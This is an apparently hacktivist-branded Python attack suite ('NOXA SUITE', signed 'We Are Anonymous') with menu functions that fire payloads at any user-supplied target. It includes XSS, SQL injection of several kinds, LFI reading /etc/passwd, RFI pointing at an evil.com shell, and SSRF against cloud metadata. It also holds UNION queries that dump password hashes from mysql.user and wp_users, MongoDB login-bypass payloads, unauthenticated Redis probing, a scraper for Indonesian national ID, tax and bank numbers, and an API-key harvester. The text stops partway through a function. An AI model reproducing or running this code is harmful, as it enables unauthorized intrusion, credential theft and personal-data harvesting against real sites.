#!/usr/bin/env python3
# ================================================================
# ░▒▓ NOXA SUITE v12.0 - PHANTOM EDITION ▓▒░
# 197 Features | Real-Time | Arif Hidayatullah | Mr.RanzzSky Legion
# ================================================================

import os, re, sys, time, json, csv, socket, ssl, base64, hashlib, hmac
import random, string, zipfile, threading, shutil, subprocess, platform
import requests
from urllib.parse import urlparse, urljoin, quote, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta

try:
    from fpdf import FPDF
    HAS_PDF = True
except ImportError:
    HAS_PDF = False

G='\033[92m'; R='\033[91m'; Y='\033[93m'; B='\033[94m'; C='\033[96m'; M='\033[95m'; W='\033[0m'
HEADERS = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0"}
SCOPE_FILE = "scope.json"

RESULTS = {k:[] for k in ["xss","sql","lfi","rfi","ssrf","open_redirect","cors","csrf",
    "headers_issues","admin_panels","subdomains","open_ports","dorks","tech","cookies",
    "reverse_ip","wayback","db_dump","blind_data","post_sqli","cookie_sqli","header_sqli",
    "injection_points","mongodb","redis","elasticsearch","cassandra","api_keys","jwt",
    "graphql","post_exploit","leaked_env","s3_buckets","source_maps","kubernetes","docker",
    "aws_metadata","gcp_metadata","azure_metadata","etcd","consul","vault","cve","exploits",
    "hash_id","takeover","email_osint","phone_osint","username_hits","brute_hits","payloads",
    "utils","nuclei","scope","js_endpoints","params","active_scan","dirbust","shodan",
    "hunter","virustotal","wayback_urls","cms","waf_bypass","sqli_union","xss_dom",
    "ssrf_cloud","xxe_oob","csrf_bypass","oauth","jwt_crack","race_condition",
    "http2_smuggling","request_smuggling","cache_poison","web_cache","host_header",
    "subdomain_enum","origin_ip","cloud_enum","git_dump","backup_brute"]}
RESULTS.update({"target":"","timestamp":"","scan_log":[],"data":{},"whois":{},"dns":{},
    "geoip":{},"ssl":{},"dbms":"","waf":""})

def is_termux(): return os.path.exists('/data/data/com.termux')
def check_tool(t): return subprocess.run(["which",t], capture_output=True).returncode == 0
def install_tool(t, pkg=None):
    pkg = pkg or t
    rt(f"Install {t}...", Y)
    if is_termux(): os.system(f"pkg install {pkg} -y 2>/dev/null")
    else: os.system(f"sudo apt install {pkg} -y 2>/dev/null")
def ask(p): return input(f"{B}[?] {p}: {W}").strip()
def norm(u):
    if not u.startswith(('http://','https://')): u='http://'+u
    return u

def rt(msg, color=W, prefix="[*]"):
    ts = datetime.now().strftime('%H:%M:%S')
    print(f"{color}[{ts}] {prefix} {msg}{W}", flush=True)
def ok(msg): rt(msg, G, "[✓]")
def err(msg): rt(msg, R, "[✗]")
def info(msg): rt(msg, B, "[i]")
def warn(msg): rt(msg, Y, "[!]")
def vuln(msg): rt(msg, R, "[VULN]")

def voice(m="Siap eksekusi, mulia!"):
    print(f"\n{G}╭────────────────────────────────────────────────╮{W}", flush=True)
    print(f"{G}│ 🖤 NOXA: \"{m}\"{W}", flush=True)
    print(f"{G}╰────────────────────────────────────────────────╯{W}", flush=True)
def sig():
    print(f"\n{C}══════════════════════════════════════════════════════════{W}")
    print(f"{Y}   \"We Are Anonymous from Mr.RanzzSky legion\"{W}")
    print(f"{Y}   \"no porensif no legit\"{W}")
    print(f"{C}══════════════════════════════════════════════════════════{W}")

def save_report():
    RESULTS["timestamp"] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open('noxa_report.json','w',encoding='utf-8') as f:
        json.dump(RESULTS, f, indent=2, ensure_ascii=False, default=str)
    ok("noxa_report.json tersimpan")

def banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"""{R}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠐⠂⠂⠢⠄⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣶⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣷⣯⡟⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣾⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡯⠯⠓⠃⠠⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣾⣿⡿⣿⡿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣼⠏⠗⠋⠁⠀⠀⠀⠀⠀⠒⠨⠙⠻⣿⣿⣿⣟⠁⠀⠀⠀⠀⢀⣠⣴⣤⣄⡀⠀⠀⠀⠀⠀
⢰⠃⠀⠀⠀⠀⣀⡀⡀⢀⠀⠀⠀⠀⢴⣾⣿⣿⣿⣧⠄⠀⠀⣴⣿⣿⠿⣿⢯⡷⡄⠀⠀⠀⠀
⠃⠀⠀⣰⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠈⢿⣿⣿⣏⢀⡀⠐⢉⠄⠒⠀⠒⠈⠑⡭⠀⠀⠀⠀
⠀⠀⣾⣿⣿⡿⠛⢋⡉⠭⠍⣙⠛⠣⠄⢀⣼⣿⣿⣷⣸⡁⠊⠀⠀⠀⠀⠀⢀⡀⠀⠁⠀⠀⠀
⠀⠀⢹⣿⠏⠀⠈⠀⠀⠀⠀⠀⣈⠀⣠⣾⣭⣻⣿⣿⣷⢻⣶⣶⣿⣴⣴⣶⣶⣶⣶⢦⡄⠀⠀
⠀⠀⠡⠙⢀⣀⣠⠤⠤⠴⣒⣩⣴⣾⣿⣿⠶⡌⣿⣿⣿⣷⢿⣿⣿⣿⣿⣿⣿⢿⣹⠞⡜⠠⠀
⢸⠃⢀⣤⣴⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣯⣿⡵⢻⣿⣿⣿⣯⢷⣿⣿⣿⣟⣿⡿⣽⠎⣌⠡⠀
⢀⢀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣿⣇⠏⢉⡿⡿⠿⠏⠈⠿⠁⠀⠈⠁⠉⠈⠸⠀⠀⠀
⠈⢰⣿⣿⣿⢿⣿⣿⣿⣿⣿⠟⠋⠈⠻⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣤⣄⣀⠀⠀⠀⠸
⠀⠀⠛⡿⣟⣿⡿⡾⡟⠛⠀⢀⣴⣧⡀⢀⣀⡄⠀⠀⠀⠀⠀⠀⠙⣿⠿⣿⣿⡻⡧⠀⠀⠀⠀
⠀⠀⡀⠀⠉⠀⠁⠀⠀⣠⣴⣿⣿⣿⣿⣿⡟⠁⠀⠀⢀⣦⣀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀
⠀⠀⠘⠆⠀⠀⠀⠀⠈⠑⠿⢿⠿⠟⠛⠉⠀⠀⠀⠀⠾⠟⠛⠓⠀⠀⠀⠀⣀⣠⠤⠐⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠢⡀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⢤⣴⣦⣶⢶⣷⢻⠿⠙⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠲⣀⠀⠈⠑⠒⠶⠖⠲⢫⢛⡛⢞⠫⠽⠛⠛⠈⠉⠁⠀⠀⠀⢀⠀⠀⢀⠈⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠲⣀⠀⠀⡀⠠⠀⠠⠠⠠⠠⣀⠀⠀⠀⠀⠀⡰⣝⢾⡙⠦⠁⠀⠂⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢣⠀⠀⡀⡈⠅⢏⠳⣿⣛⠗⠂⠐⠁⠈⢽⣞⡹⡐⠀⠌⠀⠀⠀⠀
{W}{R}no porensif no legit{W}
{G}WhatsApp : +62881012765716{W}
{C}My name is Arif Hidayatullah{W}
{Y}We Are Anonymous from Mr.RanzzSky legion{W}
{M}══════════════════════════════════════════════════════════{W}
{R}  NOXA SUITE v12.0 | Family | Project | Mr.RanzzSky{W}
{M}══════════════════════════════════════════════════════════{W}
""", flush=True)

# ============================================================
# CORE TOOLS (v2-v11) - dipadatkan
# ============================================================
def xss_scanner(url=None, silent=False):
    if not silent: voice("Testing XSS...")
    if not url: url = norm(ask("URL target"))
    RESULTS["target"] = url
    payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>",
                "'><svg onload=alert(1)>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]
    info(f"Testing {len(payloads)} XSS...")
    for i,p in enumerate(payloads,1):
        try:
            r = requests.get(url+p, headers=HEADERS, timeout=8)
            if p in r.text or p.replace('"','&quot;') in r.text:
                vuln(f"XSS #{i}: {p[:50]}")
                RESULTS["xss"].append({"payload":p,"url":url+p})
            else: ok(f"#{i} clean")
        except: err(f"#{i} error")

def sql_scanner(url=None, silent=False):
    if not silent: voice("Testing SQL Injection...")
    if not url: url = norm(ask("URL target (?id=1)"))
    if '?' not in url: err("URL harus punya parameter"); return
    RESULTS["target"] = url
    payloads = ["'", "\"", "1' OR '1'='1", "1' AND '1'='2", "' UNION SELECT NULL--",
                "' OR 1=1--", "1 AND SLEEP(5)", "admin'--"]
    errors = ["sql syntax","mysql_","ora-","postgresql","sqlite","odbc","jdbc",
              "you have an error in your sql","warning: mysql"]
    info(f"Testing {len(payloads)} SQL payload...")
    for i,p in enumerate(payloads,1):
        try:
            t0 = time.time()
            r = requests.get(url+p, headers=HEADERS, timeout=15)
            el = time.time()-t0
            hit=False
            for e in errors:
                if e in r.text.lower():
                    vuln(f"SQLi #{i}: {p} -> {e}")
                    RESULTS["sql"].append({"payload":p,"type":"error","evidence":e}); hit=True; break
            if not hit and 'SLEEP' in p.upper() and el>4:
                vuln(f"TIME-BLIND #{i}: {p} ({el:.1f}s)")
                RESULTS["sql"].append({"payload":p,"type":"time"}); hit=True
            if not hit: ok(f"#{i} clean")
        except: err(f"#{i}")

def lfi_scanner(url=None, silent=False):
    if not silent: voice("Testing LFI...")
    if not url: url = norm(ask("URL target"))
    for p in ["../../../../etc/passwd","..%2F..%2F..%2Fetc%2Fpasswd","/etc/passwd"]:
        try:
            r = requests.get(url+p, headers=HEADERS, timeout=8)
            if "root:x:0:0" in r.text:
                vuln(f"LFI: {p}"); RESULTS["lfi"].append({"payload":p})
            else: ok(f"{p[:40]} clean")
        except: pass

def rfi_scanner(url=None, silent=False):
    if not silent: voice("Testing RFI...")
    if not url: url = norm(ask("URL target"))
    for p in ["http://evil.com/shell.txt","//evil.com/shell"]:
        try:
            r = requests.get(url+p, headers=HEADERS, timeout=8)
            if "evil.com" in r.text:
                warn(f"RFI: {p}"); RESULTS["rfi"].append({"payload":p})
        except: pass

def ssrf_scanner(url=None, silent=False):
    if not silent: voice("Testing SSRF...")
    if not url: url = norm(ask("URL target"))
    for p in ["http://127.0.0.1:80","http://169.254.169.254/latest/meta-data/"]:
        try:
            r = requests.get(url+p, headers=HEADERS, timeout=8)
            if "meta-data" in r.text:
                vuln(f"SSRF: {p}"); RESULTS["ssrf"].append({"payload":p})
        except: pass

def open_redirect(url=None, silent=False):
    if not silent: voice("Open Redirect...")
    if not url: url = norm(ask("URL target"))
    for p in ["//evil.com","https://evil.com"]:
        try:
            r = requests.get(url+p, headers=HEADERS, timeout=8, allow_redirects=False)
            if r.status_code in [301,302] and "evil.com" in r.headers.get("Location",""):
                vuln(f"Redirect: {p}"); RESULTS["open_redirect"].append({"payload":p})
        except: pass

def cors_check(url=None, silent=False):
    if not silent: voice("CORS check...")
    if not url: url = norm(ask("URL target"))
    try:
        r = requests.get(url, headers={**HEADERS,"Origin":"https://evil.com"}, timeout=8)
        acao = r.headers.get("Access-Control-Allow-Origin","")
        if acao in ["https://evil.com","*"]:
            vuln(f"CORS: {acao}"); RESULTS["cors"].append({"acao":acao})
        else: ok("CORS OK")
    except: pass

def csrf_check(url=None, silent=False):
    if not silent: voice("CSRF check...")
    if not url: url = norm(ask("URL form target"))
    try:
        r = requests.get(url, headers=HEADERS, timeout=8)
        has_token = bool(re.search(r'(csrf|_token|authenticity_token)', r.text, re.I))
        has_form = bool(re.search(r'<form', r.text, re.I))
        if has_form and not has_token:
            vuln("No CSRF token!"); RESULTS["csrf"].append({"issue":"no_csrf"})
        elif has_form: ok("CSRF token ada")
    except: pass

def header_check(url=None, silent=False):
    if not silent: voice("Header check...")
    if not url: url = norm(ask("URL target"))
    try:
        r = requests.get(url, headers=HEADERS, timeout=8)
        h = r.headers
        for k in ["X-Frame-Options","X-Content-Type-Options","Strict-Transport-Security",
                  "Content-Security-Policy","X-XSS-Protection","Referrer-Policy"]:
            if k in h: ok(f"{k}")
            else: warn(f"MISSING {k}"); RESULTS["headers_issues"].append(k)
    except: pass

ADMIN_PATHS = ['admin','admin/','admin/login','administrator','wp-admin','wp-login.php',
    'cpanel','panel','dashboard','login','signin','adminpanel','backend','controlpanel',
    'cp','adm','sysadmin','phpmyadmin','user/login','member','login.php','auth']

def admin_finder(url=None, silent=False):
    if not silent: voice("Admin finder...")
    if not url: url = norm(ask("URL target"))
    def check(p):
        u = urljoin(url, p)
        try:
            r = requests.get(u, headers=HEADERS, timeout=5, allow_redirects=False)
            if r.status_code == 200 and any(k in r.text.lower() for k in ['password','login','username']):
                return ("FOUND",u,r.status_code)
            elif r.status_code in [401,403]:
                return ("PROTECTED",u,r.status_code)
        except: pass
        return None
    info(f"Scanning {len(ADMIN_PATHS)} admin paths...")
    with ThreadPoolExecutor(max_workers=25) as ex:
        for r in ex.map(check, ADMIN_PATHS):
            if r:
                if r[0]=="FOUND": ok(f"FOUND: {r[1]}"); RESULTS["admin_panels"].append(r[1])
                else: warn(f"PROTECTED: {r[1]}")

def subdomain_finder(domain=None, silent=False):
    if not silent: voice("Subdomain finder...")
    if not domain: domain = ask("Domain")
    if domain.startswith('http'): domain = urlparse(domain).netloc
    words = ['www','mail','ftp','admin','dev','test','api','blog','shop','panel',
             'cpanel','webmail','server','ns1','ns2','vpn','portal','app','staging','cdn']
    def check(s):
        u = f"http://{s}.{domain}"
        try:
            r = requests.get(u, headers=HEADERS, timeout=3, allow_redirects=False)
            return (u, r.status_code)
        except: return None
    info(f"Scanning {len(words)} subdomains...")
    with ThreadPoolExecutor(max_workers=20) as ex:
        for r in ex.map(check, words):
            if r: ok(f"{r[0]} -> {r[1]}"); RESULTS["subdomains"].append(r[0])

def port_scanner(host=None, silent=False):
    if not silent: voice("Port scanner...")
    if not host: host = ask("Host/IP")
    if host.startswith('http'): host = urlparse(host).netloc.split(':')[0]
    common = [21,22,23,25,53,80,110,143,443,445,993,995,1433,1521,3306,3389,
              5432,5900,6379,8080,8443,8888,9000,2375,2379,27017,9200,6443]
    def scan(p):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1)
            if s.connect_ex((host,p)) == 0:
                try: srv = socket.getservbyport(p)
                except: srv = "unknown"
                return (p, srv)
            s.close()
        except: pass
        return None
    info(f"Scanning {len(common)} ports...")
    with ThreadPoolExecutor(max_workers=50) as ex:
        for r in ex.map(scan, common):
            if r: ok(f"Port {r[0]} OPEN ({r[1]})"); RESULTS["open_ports"].append(r)

def whois_lookup(domain=None, silent=False):
    if not silent: voice("Whois...")
    if not domain: domain = ask("Domain")
    if domain.startswith('http'): domain = urlparse(domain).netloc
    try:
        import whois
    except:
        os.system("pip install python-whois 2>/dev/null"); import whois
    try:
        w = whois.whois(domain)
        for k,v in w.items():
            if v: info(f"{k}: {str(v)[:150]}"); RESULTS["whois"][k] = str(v)
    except Exception as e: err(str(e))

def dns_lookup(domain=None, silent=False):
    if not silent: voice("DNS lookup...")
    if not domain: domain = ask("Domain")
    if domain.startswith('http'): domain = urlparse(domain).netloc
    try:
        ips = socket.gethostbyname_ex(domain)
        for ip in ips[2]: ok(ip)
        RESULTS["dns"] = {"host":ips[0],"ips":ips[2]}
    except Exception as e: err(str(e))

def geoip(target=None, silent=False):
    if not silent: voice("GeoIP...")
    if not target: target = ask("IP/Domain")
    try:
        if not re.match(r'^\d+\.\d+\.\d+\.\d+$', target): target = socket.gethostbyname(target)
        r = requests.get(f"http://ip-api.com/json/{target}", timeout=8).json()
        for k,v in r.items(): info(f"{k}: {v}")
        RESULTS["geoip"] = r
    except Exception as e: err(str(e))

def ssl_info(domain=None, silent=False):
    if not silent: voice("SSL info...")
    if not domain: domain = ask("Domain")
    if domain.startswith('http'): domain = urlparse(domain).netloc.split(':')[0]
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
            s.settimeout(5); s.connect((domain, 443)); cert = s.getpeercert()
        info(f"Subject: {dict(x[0] for x in cert['subject'])}")
        info(f"Issuer: {dict(x[0] for x in cert['issuer'])}")
        RESULTS["ssl"] = {"subject":dict(x[0] for x in cert['subject'])}
    except Exception as e: err(str(e))

def tech_detect(url=None, silent=False):
    if not silent: voice("Tech detect...")
    if not url: url = norm(ask("URL target"))
    try:
        r = requests.get(url, headers=HEADERS, timeout=10)
        h = r.headers; body = r.text.lower()
        info(f"Server: {h.get('Server','N/A')}")
        info(f"X-Powered-By: {h.get('X-Powered-By','N/A')}")
        techs = []
        for k,v in {'wp-content':'WordPress','joomla':'Joomla','laravel':'Laravel',
                    'react':'React','vue':'Vue.js','jquery':'jQuery'}.items():
            if k in body: techs.append(v)
        if techs: ok(f"Tech: {', '.join(set(techs))}"); RESULTS["tech"] = list(set(techs))
    except Exception as e: err(str(e))

def cookie_analyzer(url=None, silent=False):
    if not silent: voice("Cookie...")
    if not url: url = norm(ask("URL target"))
    try:
        r = requests.get(url, headers=HEADERS, timeout=8)
        for c in r.cookies: info(f"{c.name} = {c.value[:50]}"); RESULTS["cookies"].append({"name":c.name,"secure":bool(c.secure)})
    except: pass

def wayback(url=None, silent=False):
    if not silent: voice("Wayback...")
    if not url: url = norm(ask("URL target"))
    try:
        r = requests.get(f"http://archive.org/wayback/available?url={url}", timeout=10).json()
        if r.get('archived_snapshots'):
            snap = r['archived_snapshots'].get('closest',{})
            info(snap.get('url','N/A')); RESULTS["wayback"].append(snap)
    except: pass

def reverse_ip(domain=None, silent=False):
    if not silent: voice("Reverse IP...")
    if not domain: domain = ask("Domain")
    if domain.startswith('http'): domain = urlparse(domain).netloc
    try:
        ip = socket.gethostbyname(domain)
        r = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", timeout=10)
        for l in r.text.strip().split('\n')[:20]: info(l)
        RESULTS["reverse_ip"] = r.text.strip().split('\n')[:50]
    except: pass

def dork_gen(domain=None, silent=False):
    if not silent: voice("Dorks...")
    if not domain: domain = ask("Domain")
    if domain.startswith('http'): domain = urlparse(domain).netloc
    dorks = [f'site:{domain} inurl:admin', f'site:{domain} inurl:login',
             f'site:{domain} ext:sql', f'site:{domain} "password"']
    for d in dorks: info(d)
    RESULTS["dorks"] = dorks

def data_extractor(url=None, silent=False):
    if not silent: voice("Data extractor...")
    if not url: url = norm(ask("URL target"))
    data = {"Email":[],"Nomor HP":[],"NIK":[],"NPWP":[],"Rekening":[],"Alamat":[],"Nama":[]}
    for u in [url, urljoin(url,'/about'), urljoin(url,'/contact')]:
        try:
            r = requests.get(u, headers=HEADERS, timeout=8)
            patterns = {"Email": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                "Nomor HP": r'(?:\+62|62|0)8[0-9]{7,12}',"NIK": r'\b[0-9]{16}\b',
                "NPWP": r'\b[0-9]{2}\.[0-9]{3}\.[0-9]{3}\.[0-9]{3}-[0-9]{3}\.[0-9]{3}\b',
                "Rekening": r'\b[0-9]{10,16}\b',
                "Alamat": r'(?:Jl\.|Jalan|Desa|Kec\.|Kab\.)[\s\w.,\-\/]{5,80}',
                "Nama": r'\b[A-Z][a-z]+(?:\s[A-Z][a-z]+){1,3}\b'}
            for k,p in patterns.items():
                for f in set(re.findall(p, r.text)):
                    if f not in data[k]: data[k].append(f)
        except: pass
    for k,v in data.items():
        if v:
            ok(f"{k} ({len(v)})")
            for x in v[:10]: info(f"  {x}")
    RESULTS["data"] = data

# DB ASSAULT
def waf_detector(url=None, silent=False):
    if not silent: voice("WAF detect...")
    if not url: url = norm(ask("URL target"))
    waf_sigs = {"Cloudflare":["cloudflare","cf-ray"],"AWS WAF":["awselb"],
                "Akamai":["akamai"],"Sucuri":["sucuri"],"Imperva":["imperva"],
                "ModSecurity":["mod_security"]}
    detected = None
    for p in ["' OR 1=1--","<script>alert(1)</script>","../../etc/passwd"]:
        try:
            r = requests.get(url+"?test="+quote(p), headers=HEADERS, timeout=8)
            txt = (r.text + str(r.headers)).lower()
            for waf, sigs in waf_sigs.items():
                for s in sigs:
                    if s in txt: vuln(f"WAF: {waf}"); detected = waf; break
                if detected: break
        except: pass
    if detected: RESULTS["waf"] = detected
    elif not silent: ok("Tidak ada WAF")

def dbms_fingerprint(url=None, silent=False):
    if not silent: voice("DBMS fingerprint...")
    if not url: url = norm(ask("URL target (?id=1)"))
    if '?' not in url: err("Parameter required"); return
    for db,payloads in {"MySQL":["' AND @@version--"],"PostgreSQL":["' AND version()--"],
        "MSSQL":["' AND @@version--"],"SQLite":["' AND sqlite_version()--"]}.items():
        for p in payloads:
            try:
                r = requests.get(url+p, headers=HEADERS, timeout=10)
                if any(e in r.text.lower() for e in ['mysql_','postgresql','mssql','sqlite','ora-']):
                    vuln(f"DBMS: {db}"); RESULTS["dbms"] = db; return
            except: pass

def error_based_extract(url=None, silent=False):
    if not silent: voice("Error-based extract...")
    if not url: url = norm(ask("URL target (?id=1)"))
    if '?' not in url: return
    for name, p in {
        "MySQL databases": "' AND 1=CONVERT(int,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata))--",
        "MySQL tables": "' AND 1=CONVERT(int,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables))--"}.items():
        try:
            r = requests.get(url+p, headers=HEADERS, timeout=10)
            m = re.findall(r"CONVERT\(int,\s*['\"]([^'\"]+)", r.text, re.I)
            if m: vuln(f"{name}: {m[0][:300]}"); RESULTS["db_dump"].append({"method":"error","name":name,"data":m[0][:500]})
        except: pass

def blind_boolean_extract(url=None, silent=False):
    if not silent: voice("Blind boolean...")
    if not url: url = norm(ask("URL target (?id=1)"))
    if '?' not in url: return
    try:
        r1 = requests.get(url+"' AND 1=1--", headers=HEADERS, timeout=10)
        r2 = requests.get(url+"' AND 1=2--", headers=HEADERS, timeout=10)
        if abs(len(r1.text)-len(r2.text)) > 50:
            vuln(f"BLIND SQLi! (true={len(r1.text)}, false={len(r2.text)})")
            RESULTS["injection_points"].append({"type":"boolean-blind"})
    except: pass

def time_based_extract(url=None, silent=False):
    if not silent: voice("Time-based...")
    if not url: url = norm(ask("URL target (?id=1)"))
    if '?' not in url: return
    for db,p in {"MySQL":"' AND SLEEP(5)-- ","MSSQL":"'; WAITFOR DELAY '0:0:5'--"}.items():
        try:
            t0 = time.time()
            r = requests.get(url+p, headers=HEADERS, timeout=15)
            if time.time()-t0 >= 4.5: vuln(f"TIME-BLIND [{db}]"); RESULTS["injection_points"].append({"type":"time-blind","dbms":db})
        except: pass

def union_based_extract(url=None, silent=False):
    if not silent: voice("UNION-based...")
    if not url: url = norm(ask("URL target (?id=1)"))
    if '?' not in url: return
    for n in range(1,15):
        try:
            r = requests.get(url+"' UNION SELECT "+",".join(["NULL"]*n)+"--", headers=HEADERS, timeout=8)
            if r.status_code == 200 and "error" not in r.text.lower()[:500]: ok(f"Kolom: {n}"); break
        except: pass

def post_sqli(url=None, silent=False):
    if not silent: voice("POST SQLi...")
    if not url: url = norm(ask("URL login"))
    params_input = ask("Parameter POST (contoh: username=admin&password=test)")
    if not params_input: return
    params = {}
    for kv in params_input.split('&'):
        if '=' in kv: k,v = kv.split('=',1); params[k]=v
    for param in params:
        for p in ["'", "1' OR '1'='1", "admin'--"]:
            test = params.copy(); test[param] = p
            try:
                r = requests.post(url, data=test, headers=HEADERS, timeout=15)
                if any(e in r.text.lower() for e in ['sql syntax','mysql_','you have an error']):
                    vuln(f"VULN {param}={p}"); RESULTS["post_sqli"].append({"param":param,"payload":p})
            except: pass

def cookie_sqli(url=None, silent=False):
    if not silent: voice("Cookie SQLi...")
    if not url: url = norm(ask("URL target"))
    try: cookies = requests.get(url, headers=HEADERS, timeout=8).cookies.get_dict()
    except: cookies = {}
    if not cookies: err("Tidak ada cookies"); return
    for cname in cookies:
        for p in ["'", "1' OR '1'='1"]:
            test = cookies.copy(); test[cname] = p
            try:
                r = requests.get(url, cookies=test, headers=HEADERS, timeout=10)
                if any(e in r.text.lower() for e in ['sql syntax','mysql_']):
                    vuln(f"VULN cookie '{cname}'"); RESULTS["cookie_sqli"].append({"cookie":cname})
            except: pass

def header_sqli(url=None, silent=False):
    if not silent: voice("Header SQLi...")
    if not url: url = norm(ask("URL target"))
    for h in ["User-Agent","Referer","X-Forwarded-For"]:
        for p in ["'", "' OR '1'='1"]:
            test = HEADERS.copy(); test[h] = p
            try:
                r = requests.get(url, headers=test, timeout=10)
                if any(e in r.text.lower() for e in ['sql syntax','mysql_']):
                    vuln(f"VULN header '{h}'"); RESULTS["header_sqli"].append({"header":h})
            except: pass

def hash_dumper(url=None, silent=False):
    if not silent: voice("Hash dumper...")
    if not url: url = norm(ask("URL target (?id=1)"))
    if '?' not in url: return
    for name,q in [
        ("MySQL", "' UNION SELECT CONCAT(user,0x3a,authentication_string) FROM mysql.user--"),
        ("WordPress", "' UNION SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users--")]:
        try:
            r = requests.get(url+q, headers=HEADERS, timeout=12)
            for u,h in re.findall(r'\b([a-zA-Z0-9_]{3,20}):([a-fA-F0-9]{20,64})\b', r.text)[:10]:
                vuln(f"{u}:{h}"); RESULTS["db_dump"].append({"source":name,"user":u,"hash":h})
        except: pass

# NOSQL
def mongodb_scan(host=None, silent=False):
    if not silent: voice("MongoDB scan...")
    if not host:
        h = ask("Host/IP"); host = urlparse(h).netloc.split(':')[0] if '://' in h else h
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3)
        if s.connect_ex((host, 27017)) == 0:
            vuln("Port 27017 OPEN"); RESULTS["mongodb"].append({"host":host})
        s.close()
    except: pass

def mongodb_injection(url=None, silent=False):
    if not silent: voice("MongoDB NoSQLi...")
    if not url: url = norm(ask("URL login POST JSON"))
    for i,p in enumerate([
        {"username":{"$ne":None},"password":{"$ne":None}},
        {"username":{"$gt":""},"password":{"$gt":""}},
        {"username":"admin","password":{"$regex":".*"}}],1):
        try:
            r = requests.post(url, json=p, headers=HEADERS, timeout=10)
            if r.status_code == 200 and any(k in r.text.lower() for k in ['token','welcome','success']):
                vuln(f"NoSQL VULN [{i}]"); RESULTS["mongodb"].append({"type":"nosqli","payload":p})
        except: pass

def redis_scan(host=None, silent=False):
    if not silent: voice("Redis scan...")
    if not host:
        h = ask("Host/IP"); host = urlparse(h).netloc.split(':')[0] if '://' in h else h
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3)
        if s.connect_ex((host, 6379)) == 0:
            vuln("Redis OPEN"); s.send(b"INFO\r\n")
            data = s.recv(4096).decode('utf-8','ignore')
            if "redis_version" in data: vuln("NO AUTH!"); RESULTS["redis"].append({"host":host,"info":data[:500]})
        s.close()
    except: pass

def elasticsearch_scan(host=None, silent=False):
    if not silent: voice("ES scan...")
    if not host:
        h = ask("Host/IP"); host = h.replace('http://','').replace('https://','').split(':')[0]
    for port in [9200,9300]:
        try:
            r = requests.get(f"http://{host}:{port}/", timeout=5)
            if r.status_code == 200: vuln(f"ES OPEN ({port})"); RESULTS["elasticsearch"].append({"port":port}); break
        except: pass

def cassandra_scan(host=None, silent=False):
    if not silent: voice("Cassandra scan...")
    if not host:
        h = ask("Host/IP"); host = urlparse(h).netloc.split(':')[0] if '://' in h else h
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3)
        if s.connect_ex((host, 9042)) == 0: vuln("Cassandra OPEN"); RESULTS["cassandra"].append({"host":host})
        s.close()
    except: pass

def api_key_hunter(url=None, silent=False):
    if not silent: voice("API key hunter...")
    if not url: url = norm(ask("URL target"))
    patterns = {"AWS": r'AKIA[0-9A-Z]{16}', "Google": r'AIza[0-9A-Za-z\-_]{35}',
        "Stripe": r'sk_live_[0-9a-zA-Z]{24,}', "GitHub": r'gh[pousr]_[A-Za-z0-9_]{36,}',
        "JWT": r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+',
        "Private Key": r'-----BEGIN (RSA |EC )?PRIVATE KEY-----'}
    for ep in ['/','/api','/js/app.js','/config.js']:
        try:
            r = requests.get(urljoin(url,ep), headers=HEADERS, timeout=8)
            for name, pat in patterns.items():
                m = re.findall(pat, r.text)
                if m:
                    vuln(f"{name} @ {ep}")
